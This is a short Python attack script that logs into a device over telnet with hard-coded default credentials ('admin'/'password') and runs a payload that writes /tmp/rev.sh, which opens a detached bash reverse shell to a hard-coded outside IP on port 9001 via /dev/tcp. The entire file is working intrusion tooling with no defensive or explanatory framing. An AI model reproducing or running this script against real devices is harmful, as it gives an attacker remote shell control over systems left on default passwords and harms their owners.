import sys
from temp import TelnetDevice

# Reverse shell script to be executed on the target device
revS = (
    "cat << 'EOF' > /tmp/rev.sh\n"
    "#!/bin/bash\n"
    "nohup bash -c 'bash >& /dev/tcp/138.91.62.132/9001 0>&1' </dev/null >/dev/null 2>&1 &\n"
    "EOF\n"
    "chmod +x /tmp/rev.sh\n"
    "bash /tmp/rev.sh"
)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <host>")
        sys.exit(1)

    host = sys.argv[1]

    dev = TelnetDevice(host, "admin", "password")

    dev.connect()
    dev.run(revS)
    dev.close()

if __name__ == "__main__":
    main()
